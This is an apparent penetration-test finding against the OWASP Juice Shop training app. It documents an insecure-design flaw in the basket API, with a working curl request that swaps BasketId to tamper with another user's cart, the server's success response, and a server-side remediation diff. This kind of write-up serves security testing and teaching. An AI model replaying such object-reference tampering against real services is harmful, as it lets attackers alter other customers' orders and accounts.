# Finding F-04: Insecure Design (Client-Trusted Object References)

- **OWASP Category**: A04:2021-Insecure Design
- **Target Component**: Juice Shop Basket API (`/api/BasketItems/`)
- **Vulnerable Parameter**: `BasketId` (POST body parameter)

---

## 1. Attack Path & Exploitation Evidence

### Step 1: Exploitation (Modifying BasketId)
An authenticated attacker intercepts the request to add an item to their basket and changes the `BasketId` in the JSON payload to another user's basket ID (e.g., changing from the attacker's basket to `6`).

**Request (curl)**:
```bash
curl -i -s -X POST -H "Authorization: Bearer attacker_token_jwt" \
  -H "Content-Type: application/json" \
  -d '{"ProductId": 1, "BasketId": "6", "quantity": 1}' \
  "http://localhost:3000/api/BasketItems/"
```

**Response Evidence**:
The API responds with a success message, confirming that the item has been added to Basket ID 6 (which belongs to a different user).
```json
{
  "status": "success",
  "data": {
    "id": 12,
    "ProductId": 1,
    "BasketId": "6",
    "quantity": 1
  }
}
```
*Result*: Attacker successfully manipulates another user's shopping basket.

---

## 2. Root Cause Analysis
The API endpoint was fundamentally designed to trust the `BasketId` provided by the client in the request body. It lacks a secure architectural design where sensitive references (like which basket belongs to the logged-in user) are derived securely on the server-side from the authenticated session context, rather than being accepted as arbitrary client input.

---

## 3. Business Impact
Attackers can arbitrarily add, modify, or delete items in other users' shopping carts. This can lead to griefing, manipulation of stock, unauthorized purchases, and significant damage to the business's reputation and customer trust.

---

## 4. Code-Level Remediation Patch
The fix requires redesigning the API to extract the associated basket ID directly from the authenticated user's session data on the server-side, ignoring any `BasketId` supplied by the client.

```diff
--- webapp/routes/basketItems.js.orig
+++ webapp/routes/basketItems.js
@@ -10,12 +10,14 @@
 module.exports = function addBasketItem () {
   return (req, res, next) => {
     const productId = req.body.ProductId;
-    // Vulnerable: Trusting client-provided BasketId
-    const basketId = req.body.BasketId;
     const quantity = req.body.quantity || 1;
+    
+    // Secure Design: Derive basket ID from authenticated user's token
+    const authenticatedUserId = req.user.id;
+    const basketId = req.user.basketId; 
 
     BasketItem.create({
       ProductId: productId,
       BasketId: basketId,
       quantity: quantity
     })
```
